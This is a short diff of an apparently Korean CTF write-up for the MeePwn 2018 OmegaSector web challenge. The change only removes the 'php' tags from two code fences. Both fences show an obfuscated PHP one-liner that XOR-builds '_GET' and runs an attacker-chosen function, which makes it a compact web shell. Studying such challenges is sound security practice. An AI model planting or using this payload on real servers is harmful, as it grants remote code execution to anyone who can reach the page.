@@ -315,13 +315,13 @@ http://human.ludibrium.meepwn.team/?human=Yes
 
 고민하던 중, [여기](https://rawsec.ml/en/MeePwn-2018-write-up/#omegasector-web)에서 방법을 찾을 수 있었다.  
 
-```php
+```
 <?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
 ```
 
 코드를 보기 좋게 정리하면 다음과 같다.  
 
-```php
+```
 <?=
 $_= "`{{{" ^ "?<>/";
 ${$_}[_](${$_}[__]);
